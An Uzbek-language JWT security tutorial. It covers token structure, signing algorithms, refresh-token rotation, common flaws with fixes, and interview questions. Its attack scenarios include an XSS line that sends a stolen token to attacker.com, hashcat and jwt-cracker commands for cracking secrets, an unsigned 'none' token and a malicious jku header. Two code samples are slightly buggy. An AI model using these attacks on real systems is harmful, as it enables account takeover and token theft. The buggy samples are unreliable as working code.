# JWT (JSON Web Tokens)

## Mundarija
1. [JWT Nima?](#jwt-nima)
2. [JWT Struktura](#jwt-struktura)
3. [Signing Algorithms](#signing-algorithms)
4. [Token Lifecycle](#token-lifecycle)
5. [Zaif vs Xavfsiz Kod](#zaif-vs-xavfsiz-kod)
6. [Real Attack Scenarios](#real-attack-scenarios)
7. [Best Practices](#best-practices)
8. [Interview Savollari](#interview-savollari)

---

## JWT Nima?

JWT (JSON Web Token) - bu kompakt, URL-safe token formati bo'lib, ikki tomon o'rtasida ma'lumotlarni xavfsiz uzatish uchun ishlatiladi.

### JWT Qachon Ishlatiladi?

```
┌─────────────────────────────────────────────────────────────┐
│                        JWT Use Cases                         │
├─────────────────────────────────────────────────────────────┤
│  1. Authentication    - Foydalanuvchi identifikatsiyasi     │
│  2. Authorization     - API endpoint'larga ruxsat           │
│  3. Information       - Tomon o'rtasida data exchange       │
│     Exchange                                                 │
│  4. Single Sign-On    - Bir marta login, ko'p servis        │
│     (SSO)                                                    │
└─────────────────────────────────────────────────────────────┘
```

### Session vs JWT

```
Session-based:
┌─────────┐         ┌─────────┐         ┌─────────┐
│ Client  │ ──1──▶  │ Server  │ ──2──▶  │ Session │
│         │ ◀──3──  │         │ ◀──4──  │  Store  │
└─────────┘         └─────────┘         └─────────┘

1. Login request
2. Create session, store in DB/Redis
3. Return session ID (cookie)
4. Validate session on each request

JWT-based:
┌─────────┐         ┌─────────┐
│ Client  │ ──1──▶  │ Server  │
│         │ ◀──2──  │         │
│         │ ──3──▶  │         │  (No session store needed)
└─────────┘         └─────────┘

1. Login request
2. Return signed JWT
3. Send JWT with each request (self-contained)
```

---

## JWT Struktura

JWT uchta qismdan iborat, nuqta (`.`) bilan ajratilgan:

```
xxxxx.yyyyy.zzzzz
  │      │     │
  │      │     └── Signature
  │      └──────── Payload
  └─────────────── Header
```

### 1. Header

```javascript
// Header - Token metadata
{
  "alg": "HS256",    // Signing algorithm
  "typ": "JWT"       // Token type
}

// Base64Url encoded:
// eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

### 2. Payload (Claims)

```javascript
// Payload - Actual data (claims)
{
  // Registered claims (standard)
  "iss": "https://api.example.com",  // Issuer
  "sub": "user_12345",                // Subject (user ID)
  "aud": "https://app.example.com",   // Audience
  "exp": 1735689600,                  // Expiration time
  "nbf": 1735603200,                  // Not before
  "iat": 1735603200,                  // Issued at
  "jti": "unique-token-id",           // JWT ID

  // Public claims (custom, but collision-resistant)
  "email": "user@example.com",

  // Private claims (custom)
  "role": "admin",
  "permissions": ["read", "write", "delete"]
}
```

### 3. Signature

```javascript
// Signature formula
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)

// Yoki RSA uchun
RSASHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  privateKey
)
```

### Visual Structure

```
┌──────────────────────────────────────────────────────────────┐
│                         JWT Token                             │
├────────────────┬────────────────────────┬────────────────────┤
│     HEADER     │        PAYLOAD         │     SIGNATURE      │
│   (Base64Url)  │      (Base64Url)       │    (Base64Url)     │
├────────────────┼────────────────────────┼────────────────────┤
│ {              │ {                      │                    │
│   "alg":"HS256"│   "sub": "user123",    │  HMACSHA256(       │
│   "typ":"JWT"  │   "name": "John",      │    header.payload, │
│ }              │   "exp": 1735689600    │    secret          │
│                │ }                      │  )                 │
└────────────────┴────────────────────────┴────────────────────┘
         │                    │                     │
         ▼                    ▼                     ▼
   eyJhbGci...         eyJzdWIi...           SflKxwRJ...
         │                    │                     │
         └────────────────────┴─────────────────────┘
                              │
                              ▼
              eyJhbGci...eyJzdWIi...SflKxwRJ...
```

---

## Signing Algorithms

### Symmetric (HMAC)

```javascript
// Bir xil secret key sign va verify uchun
// Faqat server-to-server yoki single server

// HS256, HS384, HS512
const jwt = require('jsonwebtoken');

const secret = 'my-256-bit-secret'; // Kamida 32 bytes

// Sign
const token = jwt.sign(
  { userId: '123', role: 'admin' },
  secret,
  { algorithm: 'HS256', expiresIn: '1h' }
);

// Verify
const decoded = jwt.verify(token, secret);
```

### Asymmetric (RSA, ECDSA)

```javascript
// Public/Private key pair
// Private key - sign (server)
// Public key - verify (anyone)

const fs = require('fs');
const jwt = require('jsonwebtoken');

// RS256, RS384, RS512
const privateKey = fs.readFileSync('private.pem');
const publicKey = fs.readFileSync('public.pem');

// Sign with private key
const token = jwt.sign(
  { userId: '123' },
  privateKey,
  { algorithm: 'RS256', expiresIn: '1h' }
);

// Verify with public key
const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256'] });
```

### Algorithm Comparison

```
┌────────────┬─────────────┬─────────────┬─────────────────────────┐
│ Algorithm  │ Type        │ Key Size    │ Use Case                │
├────────────┼─────────────┼─────────────┼─────────────────────────┤
│ HS256      │ Symmetric   │ 256 bit     │ Single server, simple   │
│ HS384      │ Symmetric   │ 384 bit     │ Higher security         │
│ HS512      │ Symmetric   │ 512 bit     │ Maximum HMAC security   │
├────────────┼─────────────┼─────────────┼─────────────────────────┤
│ RS256      │ Asymmetric  │ 2048+ bit   │ Microservices, SSO      │
│ RS384      │ Asymmetric  │ 3072+ bit   │ High security systems   │
│ RS512      │ Asymmetric  │ 4096+ bit   │ Government, financial   │
├────────────┼─────────────┼─────────────┼─────────────────────────┤
│ ES256      │ ECDSA       │ 256 bit     │ Mobile, compact tokens  │
│ ES384      │ ECDSA       │ 384 bit     │ Balance: speed+security │
│ ES512      │ ECDSA       │ 521 bit     │ Maximum ECDSA security  │
└────────────┴─────────────┴─────────────┴─────────────────────────┘
```

---

## Token Lifecycle

### Access Token + Refresh Token Pattern

```
┌─────────┐                              ┌─────────┐
│ Client  │                              │ Server  │
└────┬────┘                              └────┬────┘
     │                                        │
     │ 1. Login (username/password)           │
     │ ──────────────────────────────────────▶│
     │                                        │
     │ 2. Access Token (15min) + Refresh Token│
     │ ◀──────────────────────────────────────│
     │                                        │
     │ 3. API Request + Access Token          │
     │ ──────────────────────────────────────▶│
     │                                        │
     │ 4. Response                            │
     │ ◀──────────────────────────────────────│
     │                                        │
     │ ... Access Token expired ...           │
     │                                        │
     │ 5. API Request + Expired Access Token  │
     │ ──────────────────────────────────────▶│
     │                                        │
     │ 6. 401 Unauthorized                    │
     │ ◀──────────────────────────────────────│
     │                                        │
     │ 7. Refresh Request + Refresh Token     │
     │ ──────────────────────────────────────▶│
     │                                        │
     │ 8. New Access Token (+ optional new RT)│
     │ ◀──────────────────────────────────────│
     │                                        │
```

### Implementation

```javascript
// Backend: Token generation
const generateTokens = (userId) => {
  const accessToken = jwt.sign(
    { userId, type: 'access' },
    process.env.ACCESS_TOKEN_SECRET,
    { expiresIn: '15m' }
  );

  const refreshToken = jwt.sign(
    { userId, type: 'refresh' },
    process.env.REFRESH_TOKEN_SECRET,
    { expiresIn: '7d' }
  );

  return { accessToken, refreshToken };
};

// Frontend: Token refresh logic
class AuthService {
  private accessToken: string | null = null;
  private refreshToken: string | null = null;
  private refreshPromise: Promise<void> | null = null;

  async fetchWithAuth(url: string, options: RequestInit = {}): Promise<Response> {
    // Add access token to request
    const response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${this.accessToken}`
      }
    });

    // If 401, try refresh
    if (response.status === 401) {
      await this.refreshAccessToken();
      // Retry original request
      return fetch(url, {
        ...options,
        headers: {
          ...options.headers,
          'Authorization': `Bearer ${this.accessToken}`
        }
      });
    }

    return response;
  }

  private async refreshAccessToken(): Promise<void> {
    // Prevent multiple simultaneous refresh requests
    if (this.refreshPromise) {
      return this.refreshPromise;
    }

    this.refreshPromise = this.doRefresh();
    await this.refreshPromise;
    this.refreshPromise = null;
  }

  private async doRefresh(): Promise<void> {
    const response = await fetch('/api/auth/refresh', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ refreshToken: this.refreshToken })
    });

    if (!response.ok) {
      // Refresh failed - logout user
      this.logout();
      throw new Error('Session expired');
    }

    const { accessToken, refreshToken } = await response.json();
    this.accessToken = accessToken;
    this.refreshToken = refreshToken; // Refresh token rotation
  }

  logout(): void {
    this.accessToken = null;
    this.refreshToken = null;
    // Redirect to login
  }
}
```

---

## Zaif vs Xavfsiz Kod

### 1. Algorithm Confusion Attack

```javascript
// ❌ ZAIF: Algorithm ni tekshirmaydi
const decoded = jwt.verify(token, publicKey);

// Hujumchi token'ni quyidagicha o'zgartirishi mumkin:
// Header: { "alg": "HS256", "typ": "JWT" }
// Public key'ni secret sifatida ishlatib sign qiladi
// Server public key'ni HS256 secret deb o'ylaydi va VERIFY bo'ladi!

// ✅ XAVFSIZ: Algorithm'ni aniq belgilash
const decoded = jwt.verify(token, publicKey, {
  algorithms: ['RS256']  // Faqat RS256 qabul qilinadi
});
```

### 2. None Algorithm Attack

```javascript
// ❌ ZAIF: "none" algorithm qabul qilinadi
const decoded = jwt.verify(token, secret);

// Hujumchi:
// Header: { "alg": "none", "typ": "JWT" }
// Payload: { "userId": "admin", "role": "superuser" }
// Signature: (empty)
// Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiJhZG1pbiJ9.

// ✅ XAVFSIZ: "none" ni taqiqlash
const decoded = jwt.verify(token, secret, {
  algorithms: ['HS256', 'HS384', 'HS512']  // "none" yo'q
});
```

### 3. Weak Secret Key

```javascript
// ❌ ZAIF: Kuchsiz secret
const token = jwt.sign(payload, 'secret');
const token = jwt.sign(payload, 'password123');
const token = jwt.sign(payload, 'my-jwt-secret');

// Brute-force tools (hashcat, jwt-cracker) bilan osongina topiladi

// ✅ XAVFSIZ: Kuchli, random secret (256+ bits)
const crypto = require('crypto');
const secret = crypto.randomBytes(64).toString('hex');
// "a9f3b7c2e4d6f8a1b3c5d7e9f1a2b4c6d8e0f2a4b6c8d0e2f4a6b8c0d2e4f6a8..."

// Environment variable'da saqlash
const secret = process.env.JWT_SECRET;
if (!secret || secret.length < 64) {
  throw new Error('JWT_SECRET must be at least 64 characters');
}
```

### 4. Sensitive Data in Payload

```javascript
// ❌ ZAIF: Sensitive ma'lumotlar payload'da
const token = jwt.sign({
  userId: '123',
  password: 'user_password',     // XATO!
  creditCard: '4111111111111111', // XATO!
  ssn: '123-45-6789',             // XATO!
  privateKey: '-----BEGIN...'     // XATO!
}, secret);

// JWT payload Base64 encoded - osongina decode qilinadi!
// https://jwt.io da har kim ko'ra oladi

// ✅ XAVFSIZ: Minimal, non-sensitive data
const token = jwt.sign({
  userId: '123',
  role: 'user',
  // Session-specific data
  sessionId: 'sess_abc123'
}, secret);

// Sensitive data serverda, session/database'da saqlanadi
```

### 5. Missing Expiration

```javascript
// ❌ ZAIF: Token hech qachon expire bo'lmaydi
const token = jwt.sign({ userId: '123' }, secret);

// Token o'g'irlansa - abadiy access!

// ✅ XAVFSIZ: Qisqa expiration
const token = jwt.sign(
  { userId: '123' },
  secret,
  { expiresIn: '15m' }  // 15 daqiqa
);

// Verification'da ham tekshirish
const decoded = jwt.verify(token, secret, {
  maxAge: '15m'  // Server-side double check
});
```

### 6. No Audience/Issuer Validation

```javascript
// ❌ ZAIF: Har qanday token qabul qilinadi
const decoded = jwt.verify(token, secret);

// Hujumchi boshqa servis uchun yaratilgan token'ni ishlatishi mumkin

// ✅ XAVFSIZ: Audience va Issuer tekshirish
const decoded = jwt.verify(token, secret, {
  audience: 'https://myapp.com',
  issuer: 'https://auth.myapp.com',
  algorithms: ['HS256']
});

// Token yaratishda
const token = jwt.sign(
  { userId: '123' },
  secret,
  {
    audience: 'https://myapp.com',
    issuer: 'https://auth.myapp.com',
    expiresIn: '15m'
  }
);
```

---

## Real Attack Scenarios

### Scenario 1: Token Hijacking via XSS

```javascript
// Hujumchi XSS orqali token o'g'irlaydi
// Agar token localStorage'da saqlansa:

// Malicious script injected via XSS:
const token = localStorage.getItem('access_token');
fetch('https://attacker.com/steal?token=' + token);

// Hujumchi shu token bilan API'ga request yuboradi
fetch('https://api.victim.com/users/me', {
  headers: { 'Authorization': 'Bearer ' + stolenToken }
});
```

**Himoya:**
- Token'ni HttpOnly cookie'da saqlash
- XSS prevention (CSP, sanitization)
- Short token lifetime

### Scenario 2: Brute-Force Secret Key

```bash
# hashcat bilan JWT secret'ni brute-force
# Agar secret kuchsiz bo'lsa (dictionary word)

hashcat -a 0 -m 16500 jwt_token.txt wordlist.txt

# jwt-cracker tool
jwt-cracker "eyJhbGciOiJIUzI1NiIs..." "abcdefghijklmnopqrstuvwxyz" 6

# Secret "secret" bo'lsa - bir necha soniyada topiladi
```

**Himoya:**
- 256+ bit random secret
- Key rotation
- Rate limiting on auth endpoints

### Scenario 3: Refresh Token Theft

```javascript
// Hujumchi refresh token'ni o'g'irladi (XSS, MITM)
// Va uni ishlatib yangi access token oladi

// Hujumchi:
fetch('https://api.victim.com/auth/refresh', {
  method: 'POST',
  body: JSON.stringify({ refreshToken: stolenRefreshToken })
});
// Yangi access token oldi - to'liq access!
```

**Himoya:**
```javascript
// Refresh Token Rotation
// Har refresh'da yangi refresh token beriladi

app.post('/auth/refresh', async (req, res) => {
  const { refreshToken } = req.body;

  // Token valid va database'da bormi?
  const storedToken = await db.refreshTokens.findOne({ token: refreshToken });

  if (!storedToken) {
    // Token yo'q yoki allaqachon ishlatilgan
    // Ehtimol o'g'irlangan - barcha tokenlarni bekor qilish!
    await db.refreshTokens.deleteMany({ userId: storedToken?.userId });
    return res.status(401).json({ error: 'Invalid refresh token' });
  }

  // Eski token'ni o'chirish (one-time use)
  await db.refreshTokens.deleteOne({ token: refreshToken });

  // Yangi token pair
  const { accessToken, newRefreshToken } = generateTokens(storedToken.userId);

  // Yangi refresh token'ni saqlash
  await db.refreshTokens.create({
    token: newRefreshToken,
    userId: storedToken.userId,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
  });

  res.json({ accessToken, refreshToken: newRefreshToken });
});
```

### Scenario 4: JKU/X5U Header Injection

```javascript
// JWT header'da jku (JWK Set URL) yoki x5u (X.509 URL) bo'lsa
// Hujumchi o'z serveriga yo'naltirishi mumkin

// Malicious JWT:
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.com/jwks.json"  // Hujumchi serveri
}

// Server bu URL'dan public key oladi va hujumchi key'i bilan verify qiladi
```

**Himoya:**
```javascript
// JKU/X5U ni ISHLATMANG yoki whitelist
const allowedJwksUrls = [
  'https://auth.myapp.com/.well-known/jwks.json'
];

// Yoki static key
const publicKey = fs.readFileSync('public.pem');
jwt.verify(token, publicKey, {
  algorithms: ['RS256'],
  // jku, x5u header'larini ignore qilish
});
```

---

## Best Practices

### 1. Token Storage Strategy

```
┌────────────────────────────────────────────────────────────┐
│                    Storage Comparison                       │
├──────────────────┬─────────────┬─────────────┬─────────────┤
│ Storage          │ XSS Safe    │ CSRF Safe   │ Recommend   │
├──────────────────┼─────────────┼─────────────┼─────────────┤
│ localStorage     │ ❌ No       │ ✅ Yes      │ ❌ Avoid    │
│ sessionStorage   │ ❌ No       │ ✅ Yes      │ ❌ Avoid    │
│ Cookie (normal)  │ ❌ No       │ ❌ No       │ ❌ Avoid    │
│ Cookie (HttpOnly)│ ✅ Yes      │ ❌ No       │ ⚠️  +CSRF   │
│ Memory + HttpOnly│ ✅ Yes      │ ✅ Yes      │ ✅ Best     │
│   Refresh Cookie │             │             │             │
└──────────────────┴─────────────┴─────────────┴─────────────┘
```

### 2. Recommended Architecture

```javascript
// Access Token: Memory (JavaScript variable)
// Refresh Token: HttpOnly, Secure, SameSite=Strict cookie

// Frontend
class AuthService {
  private accessToken: string | null = null; // Memory only

  // Login
  async login(credentials) {
    const response = await fetch('/api/auth/login', {
      method: 'POST',
      credentials: 'include', // Cookie qabul qilish
      body: JSON.stringify(credentials)
    });

    const { accessToken } = await response.json();
    this.accessToken = accessToken; // Memory'da saqlash
    // Refresh token cookie sifatida avtomatik o'rnatiladi
  }

  // API request
  async apiRequest(url, options = {}) {
    return fetch(url, {
      ...options,
      credentials: 'include',
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${this.accessToken}`
      }
    });
  }

  // Token refresh (page reload'da)
  async refreshOnLoad() {
    const response = await fetch('/api/auth/refresh', {
      method: 'POST',
      credentials: 'include' // Refresh token cookie'dan olinadi
    });

    if (response.ok) {
      const { accessToken } = await response.json();
      this.accessToken = accessToken;
    }
  }
}

// Backend (Express)
app.post('/api/auth/login', async (req, res) => {
  const user = await validateCredentials(req.body);

  const accessToken = generateAccessToken(user.id);
  const refreshToken = generateRefreshToken(user.id);

  // Refresh token HttpOnly cookie'da
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 kun
    path: '/api/auth/refresh' // Faqat refresh endpoint'ga yuboriladi
  });

  // Access token response body'da
  res.json({ accessToken });
});
```

### 3. Token Revocation

```javascript
// JWT stateless, lekin revocation kerak bo'lganda:

// Option 1: Short-lived tokens (recommended)
// 15 daqiqa access token - compromised bo'lsa ham tez expire bo'ladi

// Option 2: Token blacklist
const tokenBlacklist = new Set();

// Logout
app.post('/api/auth/logout', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  const decoded = jwt.decode(token);

  // Token'ni blacklist'ga qo'shish
  tokenBlacklist.add(token);

  // Yoki Redis'da (TTL bilan)
  redis.setex(`blacklist:${token}`, decoded.exp - Date.now() / 1000, '1');
});

// Middleware
const verifyToken = async (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];

  // Blacklist tekshirish
  if (await redis.get(`blacklist:${token}`)) {
    return res.status(401).json({ error: 'Token revoked' });
  }

  try {
    req.user = jwt.verify(token, secret);
    next();
  } catch {
    res.status(401).json({ error: 'Invalid token' });
  }
};

// Option 3: Token versioning
// User'da tokenVersion saqlash
const token = jwt.sign({
  userId: user.id,
  tokenVersion: user.tokenVersion
}, secret);

// Verify'da version tekshirish
const verifyToken = async (req, res, next) => {
  const decoded = jwt.verify(token, secret);
  const user = await db.users.findById(decoded.userId);

  if (user.tokenVersion !== decoded.tokenVersion) {
    return res.status(401).json({ error: 'Token invalidated' });
  }
};

// Logout all devices
app.post('/api/auth/logout-all', async (req, res) => {
  await db.users.updateOne(
    { _id: req.user.id },
    { $inc: { tokenVersion: 1 } }
  );
  res.json({ message: 'All sessions invalidated' });
});
```

### 4. Security Checklist

```
□ Algorithm explicitly specified in verify()
□ Strong secret key (256+ bits, random)
□ Short access token expiration (15-30 min)
□ Refresh token rotation enabled
□ HttpOnly cookie for refresh token
□ Secure flag on production
□ SameSite=Strict or Lax
□ Audience and Issuer validation
□ No sensitive data in payload
□ Token blacklist for logout
□ Rate limiting on auth endpoints
□ HTTPS only
```

---

## Interview Savollari

### 1. JWT qanday ishlaydi va unda qanday qismlar bor?

**Javob:**
JWT uchta Base64Url encoded qismdan iborat:

1. **Header** - Token metadata:
   - `alg`: Signing algorithm (HS256, RS256)
   - `typ`: Token type (JWT)

2. **Payload** - Claims (data):
   - Registered claims: `iss`, `sub`, `aud`, `exp`, `iat`
   - Custom claims: `userId`, `role`

3. **Signature** - Integrity verification:
   - `HMACSHA256(base64(header) + "." + base64(payload), secret)`

Token valid bo'lishi uchun signature server secret bilan verify qilinadi. Payload o'zgarsa - signature invalid bo'ladi.

---

### 2. Access Token va Refresh Token farqi nima? Nima uchun ikkalasi kerak?

**Javob:**

| Aspect | Access Token | Refresh Token |
|--------|--------------|---------------|
| Maqsad | API'ga kirish | Yangi access token olish |
| Lifetime | Qisqa (15-30 min) | Uzoq (7-30 kun) |
| Storage | Memory | HttpOnly Cookie |
| Frequency | Har request | Faqat refresh vaqtida |

**Nima uchun ikkalasi:**
- Access token qisqa - o'g'irlansa kam vaqt ichida expire bo'ladi
- Refresh token uzoq - foydalanuvchi tez-tez login qilmaydi
- Refresh token HttpOnly - XSS orqali o'g'irlab bo'lmaydi
- Token rotation - refresh token bir martalik, replay attack oldini oladi

---

### 3. JWT'ni qayerda saqlash kerak? localStorage xavfsizmi?

**Javob:**

**localStorage XAVFLI:**
- XSS hujumida JavaScript orqali o'qiladi
- `localStorage.getItem('token')` - hujumchi oson oladi

**Recommended approach:**
```
Access Token  → Memory (JavaScript variable)
Refresh Token → HttpOnly, Secure, SameSite=Strict cookie
```

**Memory'da saqlash muammosi:**
- Page refresh'da yo'qoladi

**Yechim:**
- Refresh token cookie'dan foydalanib access token'ni qayta olish
- Silent refresh on page load

---

### 4. JWT algorithm confusion attack nima?

**Javob:**

Server RS256 (asymmetric) kutadi:
- Private key bilan sign
- Public key bilan verify

Hujumchi:
1. Header'ni `{"alg": "HS256"}` ga o'zgartiradi
2. Public key'ni HS256 secret sifatida ishlatib sign qiladi
3. Server public key bilan HS256 verify qiladi - SUCCESS!

**Himoya:**
```javascript
jwt.verify(token, publicKey, {
  algorithms: ['RS256']  // Faqat RS256 qabul qilish
});
```

---

### 5. JWT stateless bo'lsa, qanday qilib logout qilish mumkin?

**Javob:**

**Muammo:** JWT o'zida barcha ma'lumotni saqlaydi, server state yo'q.

**Yechimlar:**

1. **Short expiration** - 15 daqiqa, tez expire bo'ladi

2. **Token blacklist:**
   ```javascript
   // Redis'da blacklist
   redis.setex(`blacklist:${token}`, ttl, '1');
   ```

3. **Token versioning:**
   ```javascript
   // User'da version
   { userId, tokenVersion: 3 }

   // Logout - version'ni oshirish
   user.tokenVersion++;
   ```

4. **Refresh token revocation:**
   - Database'dan refresh token'ni o'chirish
   - Access token expire bo'lganda - login kerak

**Best practice:** Qisqa access token + refresh token rotation + server-side refresh token storage.
